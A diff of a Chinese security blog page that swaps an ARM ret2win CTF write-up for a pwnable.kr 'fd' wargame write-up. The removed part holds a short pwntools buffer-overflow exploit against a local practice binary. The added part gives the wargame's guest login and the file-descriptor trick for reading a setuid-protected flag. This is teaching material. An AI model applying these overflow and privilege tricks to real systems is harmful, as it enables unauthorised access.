@@ -20,19 +20,19 @@
     var CONFIG = {"hostname":"oneshell.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":true,"nav":{"gitalk":{"order":-2}},"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="以函数pwnme为例：函数初始化的时候会保存寄存器到栈上，可以看到ARM是支持将寄存器批量保存到栈上的。这个地方说明一点，PUSH和POP操作的寄存器列表中，无论寄存器是以什么顺序给定，都会先进行升序排序。PUSH序号大的寄存器，对应POP序号小的寄存器。R11是通用寄存器，目前不知道有什么特殊性；LR（R14）是连接寄存器，用于保存函数返回地址。随后也是类似于X86&#x2F;64，通过减SP的">
+  <meta name="description" content="1ssh col@pwnable.kr -p2222 (pw:guest)  使用ssh登录上之后，查看关键文件如下： 1234567fd@pwnable:~$ ls -al-r-sr-x---   1 fd_pwn fd   7322 Jun 11  2014 fd-rw-r--r--   1 root   root  418 Jun 11  2014 fd.c-r--r-----   1 fd">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ret2win_armel">
-<meta property="og:url" content="https://oneshell.top/2023/04/07/ret2win_armel/index.html">
+<meta property="og:title" content="[pwnable] [fd]">
+<meta property="og:url" content="https://oneshell.top/2023/09/13/[pwnable]%20[fd]/index.html">
 <meta property="og:site_name" content="OneShell">
-<meta property="og:description" content="以函数pwnme为例：函数初始化的时候会保存寄存器到栈上，可以看到ARM是支持将寄存器批量保存到栈上的。这个地方说明一点，PUSH和POP操作的寄存器列表中，无论寄存器是以什么顺序给定，都会先进行升序排序。PUSH序号大的寄存器，对应POP序号小的寄存器。R11是通用寄存器，目前不知道有什么特殊性；LR（R14）是连接寄存器，用于保存函数返回地址。随后也是类似于X86&#x2F;64，通过减SP的">
+<meta property="og:description" content="1ssh col@pwnable.kr -p2222 (pw:guest)  使用ssh登录上之后，查看关键文件如下： 1234567fd@pwnable:~$ ls -al-r-sr-x---   1 fd_pwn fd   7322 Jun 11  2014 fd-rw-r--r--   1 root   root  418 Jun 11  2014 fd.c-r--r-----   1 fd">
 <meta property="og:locale">
-<meta property="article:published_time" content="2023-04-06T21:57:27.000Z">
-<meta property="article:modified_time" content="2023-04-11T05:57:02.643Z">
+<meta property="article:published_time" content="2023-09-13T02:03:00.000Z">
+<meta property="article:modified_time" content="2023-09-13T14:35:01.435Z">
 <meta property="article:author" content="OneShell">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://oneshell.top/2023/04/07/ret2win_armel/">
+<link rel="canonical" href="https://oneshell.top/2023/09/13/[pwnable]%20[fd]/">
 
 
 <script id="page-configurations">
@@ -45,7 +45,7 @@
   };
 </script>
 
-  <title>ret2win_armel | OneShell</title>
+  <title>[pwnable] [fd] | OneShell</title>
   
 
 
@@ -171,7 +171,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/07/ret2win_armel/">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/09/13/[pwnable]%20[fd]/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -184,7 +184,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          ret2win_armel
+          [pwnable] [fd]
         </h1>
 
         <div class="post-meta">
@@ -193,27 +193,17 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
+              
 
-              <time title="Created: 2023-04-07 05:57:27" itemprop="dateCreated datePublished" datetime="2023-04-07T05:57:27+08:00">2023-04-07</time>
+              <time title="Created: 2023-09-13 10:03:00 / Modified: 22:35:01" itemprop="dateCreated datePublished" datetime="2023-09-13T10:03:00+08:00">2023-09-13</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-11 13:57:02" itemprop="dateModified" datetime="2023-04-11T13:57:02+08:00">2023-04-11</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/ARMROP/" itemprop="url" rel="index"><span itemprop="name">ARMROP</span></a>
+                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
                 </span>
             </span>
 
@@ -228,20 +218,33 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>以函数pwnme为例：<br>函数初始化的时候会保存寄存器到栈上，可以看到ARM是支持将寄存器批量保存到栈上的。这个地方说明一点，PUSH和POP操作的寄存器列表中，无论寄存器是以什么顺序给定，都会先进行升序排序。PUSH序号大的寄存器，对应POP序号小的寄存器。<br>R11是通用寄存器，目前不知道有什么特殊性；LR（R14）是连接寄存器，用于保存函数返回地址。随后也是类似于X86&#x2F;64，通过减SP的方式开辟函数栈帧。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00010570 PUSH    &#123;R11,LR&#125;</span><br><span class="line">.text:00010574 ADD     R11, SP, #4</span><br><span class="line">.text:00010578 SUB     SP, SP, #0x20</span><br></pre></td></tr></table></figure>
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh col@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
 
-<p>函数调用：<br>调用子函数通过寄存器R0～R3进行传参，那么如果是有多余的参数呢，目前没有深究，估计剩下的参数就用栈来传参吧。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00010580 MOV     R2, #0x20 ; &#x27; &#x27; ; n</span><br><span class="line">.text:00010584 MOV     R1, #0          ; c</span><br><span class="line">.text:00010588 MOV     R0, R3          ; s</span><br><span class="line">.text:0001058C BL      memset</span><br></pre></td></tr></table></figure>
+<p>使用ssh登录上之后，查看关键文件如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ ls -al</span><br><span class="line">-r-sr-x---   1 fd_pwn fd   7322 Jun 11  2014 fd</span><br><span class="line">-rw-r--r--   1 root   root  418 Jun 11  2014 fd.c</span><br><span class="line">-r--r-----   1 fd_pwn root   50 Jun 11  2014 flag</span><br><span class="line"></span><br><span class="line">fd@pwnable:~$ id</span><br><span class="line">uid=1002(fd) gid=1002(fd) groups=1002(fd)</span><br></pre></td></tr></table></figure>
 
-<p>函数结束：<br>在函数初始化的时候，我们可以看到将原本SP+4的值赋给R11（fp）。在函数结束的时候，直接从R11-4就恢复了SP，就类似于使用了R11作为中间寄存器保存原本栈SP的值。<br>最后会POP R11的值，以及将初始化时的连接寄存器LR值赋值给PC，从而达到函数执行完毕返回的过程。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:000105D0 SUB     SP, R11, #4</span><br><span class="line">.text:000105D4 POP     &#123;R11,PC&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>缓冲区s起始地址为fp-24h，返回地址是保存在fp，那么输入0x24个字节就可以开始覆盖缓冲区大小。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [sp+0h] [bp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What could possibly go wrong?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You there, may I have your input please? And don&#x27;t worry about null bytes, we&#x27;re using read()!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x38</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>那么直接覆盖到返回地址</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line">rop += p32(<span class="number">0x000105EC</span>)  <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>可以看到我们想要读取的flag所有者是fd_pwn、所属组是root，而我们登录的用户是fd，用户组是fd，没有读取flag的权限。但是程序fd的所有者是fd_pwn，还设置了setuid，这就意味着用户fd运行程序fd时，程序会获得fd_pwn的权限，从而阅读flag内容。</p>
+<p>在Linux系统中，当文件的权限被设置成setuid（Set User ID）时，当该程序被执行，程序将获得文件所有者的权限，而不是执行程序的用户的权限。这可能会导致越权漏洞的发生。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">	<span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">	len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&quot;./ret2win_armv5&quot;</span></span><br><span class="line">ELF = ELF(BINARY)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;arm&quot;</span></span><br><span class="line">context.binary = BINARY</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>)</span><br><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line">rop += p32(ELF.symbols[<span class="string">&quot;ret2win&quot;</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(rop)</span><br><span class="line"><span class="built_in">print</span>(p.recvline_contains(<span class="string">b&quot;ROPE&quot;</span>))</span><br></pre></td></tr></table></figure>
+<p>根据程序的逻辑，如果想要运行到cat flag，就需要控制buf，而buf是通过read读取fd文件描述符获取的，因此，只需要使得fd&#x3D;0，就可以从标准输入中获取内容。fd&#x3D;0的方式就是使argv[1]&#x3D;0x1234。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>
+
+<h2 id="知识点小结"><a href="#知识点小结" class="headerlink" title="知识点小结"></a>知识点小结</h2><p>使用ls -al查看文件的权限：<br>文件的权限一共由10个字符组成：</p>
+<ul>
+<li>第1个字符：文件类型，常见的文件类型有-（普通文件）、d（目录）、s（套接字）、l（链接文件）、c（字符设备）、b（块设备）等等</li>
+<li>3个字符：文件所有者权限，rwx，读、写、执行，如果没有相关权限则是-</li>
+<li>3个字符：文件所属组权限，同上</li>
+<li>3个字符：其他用户权限，同上</li>
+</ul>
+<p>例如，<code>-r--r-----   1 fd_pwn root   50 Jun 11  2014 flag</code>，则是说明flag所属者是fd_pwn，拥有读权限；所属用户组是root，拥有读权限；其他用户没有任何权限。</p>
+<p>当文件的权限被设置成setuid时，文件权限的x会被替换成大写S或者小写s：</p>
+<ul>
+<li>如果文件的所有者具有执行权限，且setuid未设置，则文件执行权限是x</li>
+<li>如果文件的所有者具有执行权限，且setuid设置，则文件执行权限是S</li>
+<li>如果文件的所有者没有执行权限，且setuid设置，则文件执行权限是s</li>
+</ul>
+<p><code>-r-sr-x---   1 fd_pwn fd   7322 Jun 11  2014 fd</code>，这个表示文件所有者是fd_pwn，所有组是fd；此时fd_pwn没有执行权限，但是设置setuid；所有组fd中的账号可以运行该程序，且程序的执行权限是fd_pwn。</p>
 
     </div>
 
@@ -257,13 +260,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2023/04/06/FirmAE%EF%BC%9A%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0debug%E5%8A%9F%E8%83%BD/" rel="prev" title="FirmAE：如何实现debug功能">
-      <i class="fa fa-chevron-left"></i> FirmAE：如何实现debug功能
+    <a href="/2023/09/12/CVE-2020-15633%EF%BC%9Astrstr%E5%AF%BC%E8%87%B4%E7%9A%84%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/" rel="prev" title="CVE-2020-15633 dir-878中strstr导致的登录认证绕过">
+      <i class="fa fa-chevron-left"></i> CVE-2020-15633 dir-878中strstr导致的登录认证绕过
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2023/04/10/split_armel/" rel="next" title="split_armel">
-      split_armel <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -323,7 +323,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">2.</span> <span class="nav-text">exp</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E5%B0%8F%E7%BB%93"><span class="nav-number">1.</span> <span class="nav-text">知识点小结</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -448,7 +448,7 @@ NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
       repo        : 'BlogComments',
       owner       : 'NoneShell',
       admin       : ['NoneShell'],
-      id          : '6cd9fd18570eddbd5914ed38ea657526',
+      id          : 'd5356d41a7627bbaefcbc368c3bdffce',
         language: 'zh-CN',
       distractionFreeMode: true
     });
